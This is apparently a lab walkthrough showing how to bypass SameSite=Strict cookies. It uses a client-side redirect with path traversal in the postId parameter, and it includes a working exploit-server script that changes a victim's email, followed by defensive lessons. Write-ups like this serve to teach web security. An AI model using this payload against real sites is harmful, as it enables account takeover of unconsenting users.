# SameSite Strict bypass via client-side redirect

## Objective

Exploit a client-side redirect to bypass the victim's SameSite=Strict cookie restriction and change the victim's email address.

## Solution

1. Log in as the victim and open `/my-account`.

2. Identify the email-change endpoint:
   `/my-account/change-email`

3. Test whether the endpoint accepts a GET request in Burp Repeater:

   GET /my-account/change-email?email=attacker@web-security-academy.net HTTP/2

   The server responds with:

   HTTP/2 302 Found
   Location: /my-account?id=wiener

   This shows that the state-changing email-update action can be triggered using GET.

4. Submit a comment on a blog post and observe the confirmation page:

   `/post/comment/confirmation?postId=1`

5. Inspect the JavaScript loaded by the confirmation page. It contains:

   redirectOnConfirmation = (blogPath) => {
       setTimeout(() => {
           const url = new URL(window.location);
           const postId = url.searchParams.get('postId');
           window.location = blogPath + '/' + postId;
       }, 3000);
   }

6. The `postId` parameter is directly appended to the redirect path and is not safely validated.

7. Use path traversal in `postId` to escape the `/post/` path and reach the email-change endpoint:

   `/post/comment/confirmation?postId=../../my-account/change-email?email=attacker@web-security-academy.net`

8. Go to the Exploit Server and create an exploit that redirects the victim to the vulnerable confirmation URL:

   <script>
   window.location =
   'https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=attacker@web-security-academy.net';
   </script>

9. Replace `LAB-ID` with your actual lab hostname and use the required attacker email address.

10. Click Store, then Deliver exploit to victim.

11. The attack flow is:

   Exploit Server
        ↓
   /post/comment/confirmation?postId=...
        ↓
   Client-side redirect
        ↓
   /my-account/change-email?email=attacker@...
        ↓
   Victim's email address is changed

## Vulnerability

The application uses SameSite=Strict cookies, but the protection can be bypassed because the confirmation page performs a client-side redirect using the attacker-controlled `postId` parameter.

The vulnerable code is:

   window.location = blogPath + '/' + postId;

Path traversal allows the attacker to manipulate the redirect destination.

The vulnerability combines:

- SameSite=Strict cookies
- A state-changing action accessible through GET
- An attacker-controlled redirect parameter
- Client-side redirection
- Path traversal

## Key Lesson

SameSite=Strict should not be treated as a complete CSRF defense. State-changing operations should use appropriate HTTP methods such as POST, require CSRF protection, and strictly validate redirect and path parameters.
